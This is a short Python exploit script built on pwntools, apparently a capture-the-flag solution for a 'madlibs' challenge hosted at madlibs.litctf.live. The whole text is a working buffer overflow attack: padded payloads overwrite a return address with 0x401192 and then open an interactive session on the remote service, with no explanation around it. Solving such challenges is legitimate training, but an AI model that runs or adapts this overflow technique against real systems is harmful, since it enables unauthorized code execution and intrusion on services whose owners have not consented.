from pwn import *
io = remote("madlibs.litctf.live", 1337)
p = b'A'*44 
p += b'\x92\x11\x40'
p += b'\n'
p += b'B'*63
p += b'\n'
p += b'A'*56
p += p64(0x0000000000401192)
io.sendline(p)
io.interactive()
